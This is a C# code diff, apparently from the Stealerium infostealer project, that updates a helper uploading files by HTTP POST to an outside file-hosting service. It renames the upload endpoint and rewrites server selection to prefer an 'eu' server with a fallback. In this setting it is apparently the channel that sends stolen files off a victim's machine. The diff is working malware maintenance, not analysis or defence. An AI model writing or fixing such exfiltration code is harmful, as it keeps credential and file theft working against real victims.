@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
+using System.Net;
 using System.Net.Http;
 using System.Text.Json.Serialization;
 using System.Threading.Tasks;
@@ -26,7 +27,7 @@ namespace Stealerium.Helpers
                     { new StreamContent(File.OpenRead(file)), "file", Path.GetFileName(file) }
                 };
 
-                var response = await client.PostAsync(endpoint + "uploadFile", content).ConfigureAwait(false);
+                var response = await client.PostAsync(endpoint + "uploadfile", content).ConfigureAwait(false);
                 var responseBody = await response.Content.ReadAsStringAsync().ConfigureAwait(false);
                 var rawJson = JObject.Parse(responseBody);
                 var d = JsonConvert.SerializeObject(rawJson);
@@ -38,16 +39,35 @@ namespace Stealerium.Helpers
 
         private static async Task<string> GetServerAsync(HttpClient client)
         {
-            var request = await client.GetStringAsync(ServiceEndpoint.Replace("{server}", "api") + "getServer").ConfigureAwait(false);
+            // Fetch the server list
+            var request = await client.GetStringAsync(ServiceEndpoint.Replace("{server}", "api") + "servers").ConfigureAwait(false);
             var output = JObject.Parse(request);
-            var d = JsonConvert.SerializeObject(output);
-            var serverStatus = JsonConvert.DeserializeObject<ApiResponse>(d);
 
-            if (!serverStatus.Status.Equals("ok"))
-                throw new NotSupportedException($"FileService status returned a {serverStatus.Status} value.");
+            // Deserialize 'servers' as a list of objects
+            var servers = output["data"]?["servers"]?.ToObject<List<JObject>>();
 
-            return serverStatus.Data.First().Value?.ToString();
+            if (servers == null || servers.Count == 0)
+            {
+                throw new NotSupportedException("No servers found or the API response is invalid.");
+            }
+
+            // Pick the first server in the "eu" region
+            var preferredServer = servers.FirstOrDefault(s => s["zone"]?.ToString() == "eu")?["name"]?.ToString();
+
+            // If no server in the "eu" zone is found, fall back to the first server
+            if (string.IsNullOrEmpty(preferredServer))
+            {
+                preferredServer = servers.First()?["name"]?.ToString();
+            }
+
+            if (string.IsNullOrEmpty(preferredServer))
+            {
+                throw new NotSupportedException("No valid server name found.");
+            }
+
+            return preferredServer;
         }
+
     }
 
     /// <summary>
